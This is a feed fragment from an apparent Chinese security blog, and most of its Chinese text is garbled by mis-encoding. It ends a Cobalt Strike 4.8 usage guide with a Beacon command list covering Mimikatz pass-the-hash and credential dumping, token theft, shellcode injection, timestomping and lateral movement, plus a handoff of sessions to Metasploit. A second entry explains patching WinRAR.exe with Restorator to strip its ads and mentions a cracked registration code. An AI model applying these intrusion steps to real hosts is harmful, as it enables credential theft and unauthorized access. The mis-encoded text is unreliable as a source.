è¿›è¡Œç«¯å£æ‰«æ</span><br><span class="line">powerpick é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤</span><br><span class="line">powershell é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤</span><br><span class="line">powershell-import å¯¼å…¥powershellè„šæœ¬</span><br><span class="line">ppid Set parent PID forspawned post-ex jobs</span><br><span class="line">ps æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨</span><br><span class="line">psexec Use a service to spawn asession on a host</span><br><span class="line">psexec_psh Use PowerShell to spawn asession on a host</span><br><span class="line">psinject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤</span><br><span class="line">pth ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ</span><br><span class="line">pwd å½“å‰ç›®å½•ä½ç½®</span><br><span class="line">reg Query the registry</span><br><span class="line">rev2self æ¢å¤åŸå§‹ä»¤ç‰Œ</span><br><span class="line">rm åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹</span><br><span class="line">rportfwd ç«¯å£è½¬å‘</span><br><span class="line">run åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º)</span><br><span class="line">runas ä»¥å¦ä¸€ä¸ªç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº</span><br><span class="line">runasadmin åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº</span><br><span class="line">runu Execute a program underanother PID</span><br><span class="line">screenshot å±å¹•æˆªå›¾</span><br><span class="line">setenv è®¾ç½®ç¯å¢ƒå˜é‡</span><br><span class="line">shell cmd.exe  æ‰“å¼€cmdç»ˆç«¯</span><br><span class="line">shell ipconfig æ‰§è¡Œipconfigå‘½ä»¤</span><br><span class="line">shinject å°†shellcodeæ³¨å…¥è¿›ç¨‹</span><br><span class="line">shspawn ç”Ÿæˆè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­</span><br><span class="line">sleep è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´</span><br><span class="line">socks å¯åŠ¨SOCKS4ä»£ç†</span><br><span class="line">socks stop åœæ­¢SOCKS4</span><br><span class="line">spawn Spawn a session</span><br><span class="line">spawnas Spawn a session as anotheruser</span><br><span class="line">spawnto Set executable tospawn processes into</span><br><span class="line">spawnu Spawn a session underanother PID</span><br><span class="line">ssh ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº</span><br><span class="line">ssh-key ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº</span><br><span class="line">steal_token ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ</span><br><span class="line">timestomp å°†ä¸€ä¸ªæ–‡ä»¶æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">unlink Disconnect from parentBeacon</span><br><span class="line">upload ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">wdigest ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ®</span><br><span class="line">winrm ä½¿ç”¨WinRMåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯</span><br><span class="line">wmi ä½¿ç”¨WMIåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯</span><br><span class="line">argue è¿›ç¨‹å‚æ•°æ¬ºéª—</span><br></pre></td></tr></table></figure><p>ç®€å•æ‰§è¡Œå‘½ä»¤<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/289671437f709365de5a2814c404276a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 3 å…¨éƒ¨å‘½ä»¤3ç§’æ‰§è¡Œ(é»˜è®¤æ—¶60ç§’å¤ªé•¿ï¼Œ)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/70585c627c2b72b05a8327148763c874.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ‰§è¡Œç³»ç»Ÿå‘½ä»¤è¦åœ¨å‘½ä»¤å‰åŠ ä¸ªshell <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f19e237d101f5d2af4c7711ed17dfa1d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¸‰ã€å¦‚ä½•åŠ è½½æ’ä»¶åŠEXEï¼Ÿ">ä¸‰ã€å¦‚ä½•åŠ è½½æ’ä»¶åŠEXEï¼Ÿ</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/21e95c67f6a2dd9b78413dd1dea0a43e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a608b591991be7e7e89b5c3bb984f4b0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1efc47dcc28d2fbb0b79071e12f9baf.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9dc44ed86a5a91ea6ba0d969e4082ff3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8d62307548f725b99ad73a81ca39315b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd4168389490b83b43a09c7ca5be69d5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1f8e05004bd2fa94737dad28ab5d5c60.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>å¦‚æœä¸æƒ³åŠ è½½æ’ä»¶æƒ³ç›´æ¥ä¸Šä¼ æˆå“exeæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥çš„</strong><br>Ladonæ’ä»¶/å·¥å…·ä½“ç§¯å°ã€å…æ€<br><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7040b73f54481840d89d14852e65f8f7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥åˆ©ç”¨CSè‡ªèº«æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸Šä¼ æˆå“çš„exeæˆ–è€…ç›´æ¥ä½¿ç”¨æ’ä»¶<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2c0d3ecca0022bd64564630526353b06.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d0e664b3ab32c9f82cc3418f1ced1da5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dfb7e88979435b5388d14be7384a98a0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99cb7148de4fcebe8dec9b12715c3924.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1cac18e081c12f9b1ebb46bd8ae65368.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/02a3a3e8122eb70a4b749a633105c78b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ac9b3c70920e1ac1babff556af996d4a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å››ã€è”åŠ¨MSF<br>1ã€CS-&gt;MSF(CSæŠŠæƒé™è½¬äº¤ç»™MSF)</p><p><strong>CSï¼š</strong><br>æ–°å»ºä¸ªç›‘å¬å™¨ï¼ˆç›‘å¬çš„åè®®è¦ä¸MSFä¸€è‡´ï¼Œè¿™é‡Œç›‘å¬HTTPåè®®ï¼Œé‚£ä¹ˆMSFä¹Ÿè¦ç›‘å¬HTTPåè®®ï¼‰<br>CSç›‘å¬çš„åè®®æ˜¯windows/foreign/reverse_httpå­—æ ·</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6954a480ba11e21ac47978802618f5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>spawn msf ï¼ˆè¦è”åŠ¨çš„ä¼šè¯ä¸Šæ‰§è¡Œè¯¥å‘½ä»¤ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/751a23740a2febd0a0ed150344224f4e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§CobaltStrike4.8æ±‰åŒ–ç‰ˆå¸¦æ’ä»¶ä½¿ç”¨æ–¹æ³•</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å·¥å…·ä½¿ç”¨" scheme="https://m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Restoratorå¸¸è§ä½¿ç”¨æ–¹æ³•</title>
    <link href="https://m3x1.cn/posts/1586e22.html"/>
    <id>https://m3x1.cn/posts/1586e22.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:11:59.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Restoratorå¸¸è§ä½¿ç”¨æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ">Restoratorå¸¸è§ä½¿ç”¨æ–¹æ³•æœ‰å“ªäº›ï¼Ÿ</h2><h3 id="æ¡ˆä¾‹ä¸€ï¼šè§£å†³WinRARå¼¹å‡ºå¹¿å‘Š">æ¡ˆä¾‹ä¸€ï¼šè§£å†³WinRARå¼¹å‡ºå¹¿å‘Š</h3><h4 id="1ã€å¯¼å‡ºrcæ–‡ä»¶">1ã€å¯¼å‡ºrcæ–‡ä»¶</h4><p>WinRARå®‰è£…å®Œæˆåï¼Œç”¨Restorator 2018æ‰“å¼€å®‰è£…ç›®å½•WinRAR.exeã€‚ç‚¹å¼€â€œæ‰“å¼€â€å¯¹è¯æ¡†åï¼Œé€šè¿‡WinRARçš„å®‰è£…è·¯å¾„ï¼Œæ‰¾åˆ°è¿™ä¸ªexeç¨‹åºï¼Œç„¶åç‚¹å‡»â€œæ‰“å¼€â€ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132703168905322378488.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬2å¼ "></p><p>Restorator 2018ç•Œé¢ä¸»è¦åˆ†ä¸ºå·¦å³ä¸¤ä¸ªåŒºï¼Œå·¦è¾¹æ˜¯èµ„æºæ ‘ï¼Œæˆ‘ä»¬ç‚¹å‡»â€œå­—ç¬¦ä¸²â€å·¦è¾¹çš„åŠ å·ï¼Œåœ¨å±•å¼€çš„é¡¹ç›®ä¸­ï¼Œå³é”®ç‚¹å‡»â€œä¸­æ–‡â€ï¼Œç„¶åé€‰æ‹©â€œå¯¼å‡ºâ€â†’â€œå¯¼å‡ºä¸º.rcâ€ï¼Œä¿å­˜åˆ°æ¡Œé¢ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132703168905322323484.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬3å¼ "></p><h4 id="2ã€æ‰“å¼€rcæ–‡ä»¶">2ã€æ‰“å¼€rcæ–‡ä»¶</h4><p>ä¸Šä¸€æ­¥ä¼šå¯¼å‡ºä¸€ä¸ª.rcåç¼€çš„æ–‡ä»¶åˆ°æŒ‡å®šä½ç½®ã€‚è¿™ä¸€æ­¥æˆ‘ä»¬å»æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘å°†å¯¼å‡ºçš„æ–‡ä»¶å‘½åä¸ºâ€œWinRARå¯¼å‡ºåˆ†æ-ä¸­æ–‡(ç®€ä½“ï¼Œä¸­-å›½).rcâ€ï¼Œæ‰¾åˆ°å®ƒï¼Œå³é”®ç‚¹å¼€èœå•åé€‰æ‹©â€œæ‰“å¼€æ–¹å¼â€ï¼Œç„¶åç”¨è®°äº‹æœ¬çš„æ–¹å¼æ‰“å¼€å®ƒä¹Ÿå¯ä»¥ç”¨æ–‡æœ¬ç¼–è¾‘å·¥å…·ï¼ˆ<a href="https://www.lw50.com/post/notepadv85.html">notepad++</a>ï¼‰ä¿®æ”¹ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322441114.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬4å¼ "></p><p>æ³¨æ„é€‰æ‹©ç”¨è®°äº‹æœ¬æ‰“å¼€è¿™ä¸ª.rcæ–‡ä»¶æ—¶ï¼Œä¸è¦å‹¾é€‰â€œå§‹ç»ˆç”¨æ­¤åº”ç”¨æ‰“å¼€.rcæ–‡ä»¶â€ã€‚</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322414576.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬5å¼ "></p><h4 id="3ã€å®šä½å¼¹å¹¿ä»£ç ">3ã€å®šä½å¼¹å¹¿ä»£ç </h4><p>è¿™ä¸€æ­¥å¾ˆå…³é”®ã€‚ä¸‹å›¾å°±æ˜¯ç”¨è®°äº‹æœ¬æ‰“å¼€.rcæ–‡ä»¶çš„æ ·å­ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸€è¡Œéƒ½æœ‰ä¸ªåºæ•°ï¼Œåé¢å¼•å·é‡Œæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ“ä½œçš„åå­—ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°æœ‰å…³å¼¹çª—å¹¿å‘Šçš„ä»£ç ï¼Œå¹¶ç”¨åˆé€‚çš„æ–¹å¼è¦†ç›–å®ƒã€‚</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322461116.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬6å¼ "></p><p>ç”±äºWinRARåœ¨ä¸åœçš„æ›´æ–°ä¸­ï¼Œæ‰€æœ‰æ–°è€ç‰ˆæœ¬çš„WinRARå°†ä¼šæœ‰åŒºåˆ«ã€‚æˆ‘çš„WinRARç‰ˆæœ¬ä¸ºä¸­æ–‡ç‰ˆ6.02ï¼Œæ¶‰åŠå¼¹çª—çš„ä»£ç åœ¨ç¬¬1277è¡Œã€‚å¦‚æœä½ ç”¨çš„WinRARæ˜¯å…¶ä»–ç‰ˆæœ¬ï¼Œæœ‰å¯èƒ½ä¸æ˜¯ç¬¬1277è¡Œï¼Œä½†æ˜¯å¤§è‡´ä¹Ÿè·‘ä¸äº†1000~1300ä¹‹é—´ï¼Œç‰¹å¾æ˜¯å‰åéƒ½ä¸€ã€ä¸¤æ¡ç½‘å€ã€‚ç”±äºè¿™ä¸ªä»£ç è¡Œï¼Œç›¸å¯¹äºå…¶ä»–ä¸­æ–‡è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œä»”ç»†æ‰¾ä¸€ä¸‹å¹¶ä¸æ˜¯å¾ˆéº»çƒ¦ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132704168905322468893.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬7å¼ "></p><h4 id="4ã€è¦†ç›–å¼¹å¹¿ä»£ç ">4ã€è¦†ç›–å¼¹å¹¿ä»£ç </h4><p>æ‰¾åˆ°å¼¹çª—ä»£ç ååˆ é™¤ï¼Œæ”¹ä¸º</p><blockquote><p>â€œReminder dialog informationâ€</p></blockquote><p>æ³¨æ„ï¼šè¦ä¿ç•™å¼•å·ï¼Œé€—å·ç­‰ç­‰ï¼Œæ ¼å¼è¦ä¸ä¹‹å‰ä¿æŒä¸€è‡´ï¼Œé¿å…é©¬è™ã€‚æ”¹å¥½ä¹‹åï¼Œå·¦ä¸Šèœå•é€‰æ‹©â€œæ–‡ä»¶â€â†’â€œå¦å­˜ä¸ºâ€ï¼Œå°†è¿™ä¸ª.rcæ–‡ä»¶ä¿å­˜ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322511535.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬8å¼ "></p><h4 id="5ã€å¯¼å…¥å·²ä¿å­˜çš„-rcæ–‡ä»¶">5ã€å¯¼å…¥å·²ä¿å­˜çš„.rcæ–‡ä»¶</h4><p>è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬æŠŠåˆšæ‰å·²ä¿å­˜çš„.rcæ–‡ä»¶å¯¼å…¥åˆ°Restorator 2018ã€‚æ“ä½œä¸ä¹‹å‰ç±»ä¼¼ï¼Œå…ˆåœ¨å·¦ä¾§èµ„æºæ ‘ç‚¹â€œ+â€å±•å¼€â€œå­—ç¬¦ä¸²â€ï¼Œç„¶åå³é”®ç‚¹å‡»â€œä¸­æ–‡(xxx)â€ï¼Œèœå•ä¸­é€‰æ‹©â€œå¯¼å…¥â€â†’â€œå¯¼å…¥â€¦â€ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322575625.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬9å¼ "></p><p>æ‰“å¼€åˆšæ‰ä¿å­˜çš„.rcæ–‡ä»¶ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132705168905322566301.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬10å¼ "></p><p>æ­¤æ—¶å¯ä»¥çœ‹åˆ°Restorator 2018å³ä¾§çš„æŸ¥çœ‹å™¨å†…ï¼Œå·²ç»æ˜¯ä¹‹å‰.rcçš„æ–°å†…å®¹ï¼ˆç¬¬1277è¡Œä»£ç å·²ç»è¢«è¦†ç›–ï¼‰ï¼Œæ¥ä¸‹æ¥é€‰æ‹©â€œæ–‡ä»¶â€â†’â€œå¦å­˜ä¸ºâ€ï¼Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132706168905322653221.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬11å¼ "></p><p>å¦å­˜ä¸ºä¸€ä¸ªæ–°çš„exeæ–‡ä»¶ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322642506.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬12å¼ "></p><h4 id="6ã€è¦†ç›–æºWinRAR-exeæ–‡ä»¶">6ã€è¦†ç›–æºWinRAR.exeæ–‡ä»¶</h4><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªæ–°WinRAR.exeï¼Œç²˜è´´åˆ°WinRARç›®å½•ï¼Œè¦†ç›–åŸå®‰è£…ç›®å½•exeåŒåç¨‹åºå³å¯å¤§åŠŸå‘Šæˆï¼</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322630189.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬13å¼ "></p><p>å¥½å•¦ï¼Œç°åœ¨ä½ å†å¯åŠ¨WinRARï¼å†ä¹Ÿæ²¡æœ‰å¼¹çª—å¹¿å‘Šäº†ï¼</p><h3 id="æ¡ˆä¾‹äºŒï¼šä¿®æ”¹è½¯ä»¶æ ‡é¢˜">æ¡ˆä¾‹äºŒï¼šä¿®æ”¹è½¯ä»¶æ ‡é¢˜</h3><p>1ã€é¦–å…ˆè½½å…¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„è½¯ä»¶ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132708168905322863622.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬14å¼ "></p><p>2ã€å…ˆæ›´æ”¹æˆâ€œç¼–è¾‘æ¨¡å¼â€ã€‚æ–¹æ³•ï¼šå•æœºâ€œæŸ¥çœ‹å™¨â€â€”â€”â€œç¼–è¾‘æ¨¡å¼â€å³å¯ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132709168905322970763.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬15å¼ "></p><p>3ã€åœ¨â€œèµ„æºæ ‘â€é‡Œæ‰¾åˆ°â€œå¯¹è¯æ¡†â€â€”â€”â€œ101â€ï¼Œåœ¨å³ä¾§â€œæ ‡é¢˜â€ä¿®æ”¹ä½ å¸Œæœ›çœ‹åˆ°çš„è½¯ä»¶æ ‡é¢˜æ æ˜¾ç¤ºå†…å®¹ã€‚ä¸­é—´çš„â€œèµ„æºæŸ¥çœ‹å™¨â€ä¼šæœ‰é¢„è§ˆã€‚æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132715168905323546042.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬16å¼ "></p><p>4ã€ç„¶ååœ¨â€œèµ„æºæ ‘â€é‡Œæ‰¾åˆ°â€œå¯¹è¯æ¡†â€â€”â€”â€œ112â€è¿™ä¸€é¡¹ã€‚æˆ‘ä»¬åªéœ€å•å‡»æˆ‘ä»¬æƒ³æ”¹çš„æ–‡å­—ï¼Œåœ¨å³ä¾§â€œæ ‡é¢˜â€ä¸‹æ–¹ä¿®æ”¹å³å¯ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132717168905323752094.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬17å¼ "></p><p>5ã€ä¿®æ”¹å®Œæˆåçš„æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132725168905324596468.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬18å¼ "></p><p>6ã€ç„¶åå°±æ˜¯ä¿®æ”¹å›¾æ ‡ã€‚è¿™é‡Œæ‹¿logoæ¥æ¼”ç¤ºï¼icoå›¾æ ‡åˆ†è¾¨ç‡ä¸º32x32ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132726168905324639140.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬19å¼ "></p><p>7ã€â€œèµ„æºæ ‘â€â€”â€”â€œå›¾æ ‡â€â€”â€”â€œ105â€ï¼Œå³å‡»â€œ105â€â€”â€”â€œå¯¼å…¥â€â€”â€”â€œå¯¼å…¥åˆ°â€ï¼ŒæŠŠZOLå¯¼å…¥ï¼›æ¥ç€ç”¨åŒæ ·çš„æ–¹æ³•æŠŠå›¾æ ‡å¯¼å…¥åˆ°â€œ108â€ä¸­ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132731168905325163742.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬20å¼ "></p><p>8ã€å•å‡»æŸ¥çœ‹æ•ˆæœå¦‚ä½•ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132733168905325316894.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬21å¼ "></p><p>9ã€åœ¨â€œèµ„æºæ ‘â€é‡Œæ‰¾åˆ°â€œç‰ˆæœ¬â€é¡¹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132735168905325574811.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬22å¼ "></p><p>10ã€å³ä¸‹æ–¹å°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹çš„å†…å®¹äº†ã€‚å¯ä»¥æŠŠè‡ªå·±çš„ä¸ªäººä¿¡æ¯éƒ½å†™è¿›å»ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132737168905325796822.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬23å¼ "></p><h3 id="æ¡ˆä¾‹ä¸‰ï¼šä¿®æ”¹è½¯ä»¶å›¾æ ‡">æ¡ˆä¾‹ä¸‰ï¼šä¿®æ”¹è½¯ä»¶å›¾æ ‡</h3><p>1ã€è¿›å»ä¸»ç•Œé¢åï¼Œå¦‚æœéœ€è¦å¡«å†™æ³¨å†Œç ï¼Œæ‰“å¼€â€œæ±‰åŒ–è¯´æ˜â€è¿™ä¸ªæ–‡æœ¬ç‰¹åˆ«ä¿¡æ¯ä¸­çš„å°±æ˜¯æ³¨å†Œç ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132741168905326172413.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬24å¼ "></p><p>2ã€æ‰“å¼€ä½ è¦ä¿®æ”¹çš„æ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132742168905326273146.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬25å¼ "></p><p>3ã€æ‰“å¼€æ–‡ä»¶åï¼Œå·¦ä¾§èµ„æºæ ‘ç‚¹å‡»ï¼ˆçº¢1ï¼‰å°ä¸‰è§’æ‹‰å¼€ï¼ŒæŠŠå›¾æ ‡é¡¹ä¹Ÿæ‹‰å¼€ï¼ˆçº¢2ï¼‰ï¼Œç°åœ¨çœ‹åˆ°ï¼ˆçº¢3ï¼‰çš„æ˜¯è¯¥æ–‡ä»¶çš„åŒ…å«çš„æ‰€æœ‰ICONï¼Œé€‰ä¸­åå¯ä»¥çœ‹åˆ°å›¾æ ‡çš„ä¿¡æ¯ã€‚</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132744168905326485900.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬26å¼ "></p><p>4ã€é€‰ä¸­å›¾æ ‡_5000ï¼Œå¯ä»¥åœ¨èµ„æºæŸ¥çœ‹å™¨çœ‹åˆ°ICONçš„ä¿¡æ¯ï¼ˆçº¢1ï¼‰ï¼Œå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªæ–‡ä»¶çš„å›¾æ ‡æ ¼å¼æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œå¾€ä¸‹æ‹‰ï¼ˆçº¢2ï¼‰å°±å¯ä»¥çœ‹åˆ°RGB/Açš„å›¾åƒä¿¡æ¯ï¼Œç›®å‰çœ‹åˆ°çš„æ˜¯16è‰²ä¿¡æ¯ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132745168905326538644.jpeg" alt="Restorator 2018æ±‰åŒ–ç‰ˆé™„æ³¨å†Œç åŠä½¿ç”¨æ–¹æ³•  ç¬¬27å¼ 